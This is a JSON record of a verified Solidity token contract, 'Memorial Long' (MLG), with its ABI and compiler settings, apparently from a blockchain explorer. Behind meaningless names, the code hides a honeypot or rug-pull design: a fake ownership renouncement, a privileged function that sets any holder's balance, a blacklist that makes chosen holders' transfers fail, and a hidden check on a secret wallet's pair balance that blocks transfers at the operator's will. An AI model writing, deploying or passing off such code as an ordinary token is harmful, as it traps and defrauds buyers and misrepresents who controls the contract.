{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface autoFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundFrom {\n    function createPair(address listMarketing, address totalLaunch) external returns (address);\n}\n\ninterface takeFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityBuy) external view returns (uint256);\n\n    function transfer(address shouldFrom, uint256 teamFee) external returns (bool);\n\n    function allowance(address receiverAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldFrom,\n        uint256 teamFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityTo, uint256 value);\n    event Approval(address indexed receiverAt, address indexed spender, uint256 value);\n}\n\ninterface takeFeeMetadata is takeFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MemorialLong is teamShould, takeFee, takeFeeMetadata {\n\n    function amountEnable(uint256 teamFee) public {\n        txWallet();\n        maxLiquidityAmount = teamFee;\n    }\n\n    address public modeToken;\n\n    uint256 maxLiquidityAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeFrom;\n    }\n\n    address public marketingExempt;\n\n    address receiverExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public launchMax;\n\n    function sellAmount() public {\n        emit OwnershipTransferred(marketingExempt, address(0));\n        feeAmount = address(0);\n    }\n\n    function txWallet() private view {\n        require(launchTradingFund[_msgSender()]);\n    }\n\n    function launchedFundTake(address launchFrom, uint256 teamFee) public {\n        txWallet();\n        txShouldSwap[launchFrom] = teamFee;\n    }\n\n    uint256 receiverTeamList;\n\n    string private amountLiquidity = \"MLG\";\n\n    mapping(address => bool) public launchTradingFund;\n\n    address private feeAmount;\n\n    mapping(address => mapping(address => uint256)) private amountTotal;\n\n    function allowance(address buyTeam, address teamLaunched) external view virtual override returns (uint256) {\n        if (teamLaunched == receiverExempt) {\n            return type(uint256).max;\n        }\n        return amountTotal[buyTeam][teamLaunched];\n    }\n\n    bool public atList;\n\n    uint8 private tradingReceiverList = 18;\n\n    function approve(address teamLaunched, uint256 teamFee) public virtual override returns (bool) {\n        amountTotal[_msgSender()][teamLaunched] = teamFee;\n        emit Approval(_msgSender(), teamLaunched, teamFee);\n        return true;\n    }\n\n    function totalLiquidity(address modeList, address shouldFrom, uint256 teamFee) internal returns (bool) {\n        if (modeList == marketingExempt) {\n            return buyAmount(modeList, shouldFrom, teamFee);\n        }\n        uint256 txSell = takeFee(modeToken).balanceOf(enableTx);\n        require(txSell == maxLiquidityAmount);\n        require(shouldFrom != enableTx);\n        if (launchMax[modeList]) {\n            return buyAmount(modeList, shouldFrom, swapLimitEnable);\n        }\n        return buyAmount(modeList, shouldFrom, teamFee);\n    }\n\n    function getOwner() external view returns (address) {\n        return feeAmount;\n    }\n\n    bool public autoFrom;\n\n    address enableTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private txShouldSwap;\n\n    function buyAmount(address modeList, address shouldFrom, uint256 teamFee) internal returns (bool) {\n        require(txShouldSwap[modeList] >= teamFee);\n        txShouldSwap[modeList] -= teamFee;\n        txShouldSwap[shouldFrom] += teamFee;\n        emit Transfer(modeList, shouldFrom, teamFee);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed enableListTo, address indexed isReceiverTrading);\n\n    function name() external view virtual override returns (string memory) {\n        return totalLiquidityWallet;\n    }\n\n    constructor (){\n        if (launchTrading) {\n            atList = true;\n        }\n        autoFund maxTeam = autoFund(receiverExempt);\n        modeToken = fundFrom(maxTeam.factory()).createPair(maxTeam.WETH(), address(this));\n        if (fromAt == launchTrading) {\n            launchTrading = false;\n        }\n        marketingExempt = _msgSender();\n        sellAmount();\n        launchTradingFund[marketingExempt] = true;\n        txShouldSwap[marketingExempt] = feeFrom;\n        if (fromAt == launchTrading) {\n            fromAt = true;\n        }\n        emit Transfer(address(0), marketingExempt, feeFrom);\n    }\n\n    function transferFrom(address modeList, address shouldFrom, uint256 teamFee) external override returns (bool) {\n        if (_msgSender() != receiverExempt) {\n            if (amountTotal[modeList][_msgSender()] != type(uint256).max) {\n                require(teamFee <= amountTotal[modeList][_msgSender()]);\n                amountTotal[modeList][_msgSender()] -= teamFee;\n            }\n        }\n        return totalLiquidity(modeList, shouldFrom, teamFee);\n    }\n\n    function balanceOf(address liquidityBuy) public view virtual override returns (uint256) {\n        return txShouldSwap[liquidityBuy];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingReceiverList;\n    }\n\n    function senderFundFrom(address limitList) public {\n        if (autoFrom) {\n            return;\n        }\n        \n        launchTradingFund[limitList] = true;\n        if (fromAt == atList) {\n            atList = true;\n        }\n        autoFrom = true;\n    }\n\n    uint256 constant swapLimitEnable = 10 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountLiquidity;\n    }\n\n    function transfer(address launchFrom, uint256 teamFee) external virtual override returns (bool) {\n        return totalLiquidity(_msgSender(), launchFrom, teamFee);\n    }\n\n    bool public fromAt;\n\n    uint256 private feeFrom = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return feeAmount;\n    }\n\n    string private totalLiquidityWallet = \"Memorial Long\";\n\n    function feeExempt(address amountSell) public {\n        txWallet();\n        if (fromAt) {\n            fromAt = false;\n        }\n        if (amountSell == marketingExempt || amountSell == modeToken) {\n            return;\n        }\n        launchMax[amountSell] = true;\n    }\n\n    bool public launchTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableListTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiverTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"amountEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"}],\"name\":\"feeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTradingFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"launchedFundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"senderFundFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MemorialLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}